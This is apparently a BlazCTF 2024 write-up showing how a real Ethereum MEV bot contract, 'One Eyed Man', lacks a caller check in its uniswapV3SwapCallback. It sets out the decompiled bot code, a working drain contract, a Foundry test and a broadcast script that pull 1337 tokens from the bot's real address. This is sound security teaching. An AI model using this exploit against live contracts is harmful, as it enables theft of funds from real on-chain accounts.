# Oh Fuck Again
*Tony's heart sank again as he realized he incorrectly sent millions of dollars again. He was hacking arbitrage bots and came across a bot named [One Eyed Man](https://etherscan.io/address/0xcf9997ff3178ee54270735fdc00d4a26730787e0). He felt he can trick the bot by sending fake tokens to it but accidentally sent real money. Help Tony recover his money.*

Tags: EVM, Defi, RE

This challenge was a part of [Fuzzland's BlazCTF 2024](https://ctf.blaz.ai) and was solved by 21 teams.
## Introduction
In the handouts was the following contract (comments not included):
```solidity
contract Challenge {
    address public immutable PLAYER;
    WBTC public immutable token; // simple token contract

    constructor(address player) {
        PLAYER = player;
        token = new WBTC();
        token.transfer(0xCf9997FF3178eE54270735fDc00d4A26730787E0, 1337 ether); // 0xCf = One Eyed Man
    }

    function isSolved() external view returns (bool) {
        return token.balanceOf(PLAYER) >= 337 ether;
    }
}
```
The victim has transferred 1337 WBTC tokens to the contract of One Eyed Man.

Can you get them back?

The flag would be given if the player (solver) could get at least 337 tokens back from the One Eyed Man contract, as seen in the `isSolved()` function.

Also included were the RPC endpoints, the private key of the player and the address of the Challenge contract.

## The Bug

My first course of action in solving this challenge was to decompile the [One Eyed Man contract](https://etherscan.io/address/0xcf9997ff3178ee54270735fdc00d4a26730787e0) using [Dedaub](https://app.dedaub.com/ethereum).

I then looked for functions in the decompiled code that included a `transfer(...)`, as these would be responsible for transferring tokens.

Two functions had it:
```solidity
function 0x96ce0a56(address varg0, address varg1) public payable {  find similar
    require(msg.data.length - 4 >= 64);
    require(bool(varg0.code.size));
    v0, /* uint256 */ v1 = varg0.balanceOf(address(this)).gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require(bool(varg0.code.size));
    v2, /* uint256 */ v3 = varg0.balanceOf(varg1).gas(msg.gas);
    require(bool(v2), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    v4 = varg0.transfer(varg1, v1).gas(msg.gas);
    require(v4, fallback(0));
    require(bool(varg0.code.size));
    v5, /* uint256 */ v6 = varg0.balanceOf(varg1).gas(msg.gas);
    require(bool(v5), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
    require(RETURNDATASIZE() >= 32);
    require(v6 <= v3, v6 - v3);
    revert(fallback(0));
}
// ...
function 0x10b2(uint256 varg0, address varg1, address varg2) private { 
    MEM[64] = MEM[64] + 100;
    v0 = v1 = MEM[64] + 32;
    v2 = v3 = MEM[64];
    while (v4 >= 32) {
        MEM[v2] = MEM[v0];
        v4 = v4 - 32;
        v2 += 32;
        v0 += 32;
    }
    MEM[v2] = MEM[v0] & ~((uint8.max + 1) ** (32 - v4) - 1) | MEM[v2] & (uint8.max + 1) ** (32 - v4) - 1;
    v5, /* uint256 */ v6 = varg2.transfer(varg1, varg0).gas(msg.gas);
    if (RETURNDATASIZE() != 0) {
        v7 = new bytes[](RETURNDATASIZE());
        v6 = v7.data;
        RETURNDATACOPY(v6, 0, RETURNDATASIZE());
    }
    require(v5, Error('Oopsie'));
    return ;
}
```

The first function has a revert() at the end, meaning that no matter what, the call to it would revert.

The second function, `0x10b2()` took an amount `varg0`, receiver address `varg1` and token address `varg2`.

This function was used within the code in many places, one of which piqued my interest:

```solidity
        v85 = v86 = 0;
        v87 = v88 = msg.data[4];
        if (v88 >> uint8.max) {
            v85 = 1;
            v87 = msg.data[36];
        }
        v87 = v89 = msg.data[v0] >> 128;
        if (!v85) {
            require(bool(msg.sender.code.size));
            v90, /* uint256 */ v91 = msg.sender.token0().gas(msg.gas);
            require(bool(v90), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
            require(RETURNDATASIZE() >= 32);
        } else {
            require(bool(msg.sender.code.size));
            v92, /* uint256 */ v91 = msg.sender.token1().gas(msg.gas);
            require(bool(v92), 0, RETURNDATASIZE()); // checks call status, propagates error data on error
            require(RETURNDATASIZE() >= 32);
        }
        0x10b2(v87, msg.sender, v91);
```

Here, there were no checks for `msg.sender == owner`, meaning that anyone could call it.

The function took input from the `msg.data`, as well as calling the `msg.sender` for token information, which it then passed to the transferring function.

The name of the function above is `uniswapV3SwapCallback`, which is used by Uniswap V3 pools to request tokens from swappers after the swap has been done.
Some more information about this can be found [here](https://www.degencode.com/p/uniswap-v3-swap-callback).

An example of this function being called on the contract can be seen [here](https://app.blocksec.com/explorer/tx/eth/0xf288d3993b16e86baf5a4dfe3ecc5c3d0d7064a48bd09abc0f330fc2cadf6176?line=37). In this example, the `msg.sender` (in this case, the Uniswap V3 pool of TrumpCoin) gets transferred `amount0Delta` tokens (in wei), because it was the positive value, meaning the pool needed those tokens.

One crucial part of implementing `uniswapV3SwapCallback` correctly, is making sure the caller is a valid Uniswap V3 pool. Here, **the check was missing** (likely for gas savings and/or not expecting ERC20s to ever stay in the address), which meant that **any contract** could call the function, have it get token0/token1 from the calling contract and make off with any tokens in the contract.

This is exactly what my solution did.

## The Solution

An intermediary contract, that would handle calling the One Eyed Man contract:
```solidity
pragma solidity ^0.8.0;

interface OEM {
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

interface IERC20 {
    function transfer(address, uint256) external;
    function balanceOf(address) external returns (uint256);
}

contract RecoverTokens {
    address public immutable token0;
    address public immutable player;

    constructor(address _token0, address _player) {
        token0 = _token0;
        player = _player;
    }

    function recoverTokens() external {
        bytes memory zeroByteData = new bytes(33); // following the example transaction, 33 empty bytes
        OEM(0xCf9997FF3178eE54270735fDc00d4A26730787E0).uniswapV3SwapCallback(
            1337 ether, 0, zeroByteData
        );
        IERC20(token0).transfer(player, 1337 ether);
    }
}
```
This contract would be initialized with two fields: `token0`, the token we want to recover and `player`, the address that needs to have the funds.
Upon calling `recoverTokens()`, the contract would call the One Eyed Man contract with the necessary data to have it send us 1337 tokens. This includes 1337 ether, our amount, 0, our `amount1Delta`, which we do not need to use, and a `bytes` with 33 empty bytes.

These tokens would then be transferred to the player, to get the flag.

All we need to do is deploy the `RecoverTokens` contract and call `recoverTokens()` on it.

To test that this works, we can run the following Foundry test:
```solidity
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {RecoverTokens, IERC20} from "src/RecoverTokens.sol";
import {Challenge} from "src/Challenge.sol";

contract TestRecovery is Test {
    address player;
    address token;
    RecoverTokens recoverer;

    function setUp() public {
        vm.createSelectFork("RPC_URL_FROM_CHALLENGE");
        token = address(Challenge(0x543416d7A354d468f35b9A53DdF499174b4A36D7).token());
        player = vm.addr(0x158a42e89b44e1e30844fb14d503eee042676e00523cf8587738330a03f67ec3);
        recoverer = new RecoverTokens(token, player);
    }

    function test_recovery() public {
        recoverer.recoverTokens();
        assertEq(IERC20(token).balanceOf(player), 1337 ether);
    }
}
```
After passing the test, all that is needed is to send the transactions.
This can be done with a [Foundry script](https://book.getfoundry.sh/tutorials/solidity-scripting):
```solidity
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {RecoverTokens} from "src/RecoverTokens.sol";
import {Challenge} from "src/Challenge.sol";

contract Solve is Script {
    function run() external {
        uint256 privateKey = 0x158a42e89b44e1e30844fb14d503eee042676e00523cf8587738330a03f67ec3;
        address player = vm.addr(privateKey);
        address token = address(Challenge(0x543416d7A354d468f35b9A53DdF499174b4A36D7).token());
        vm.startBroadcast(privateKey);
        RecoverTokens recoverer = new RecoverTokens(token, player);
        recoverer.recoverTokens();
        vm.stopBroadcast();
    }
}
```

And we've got our flag.
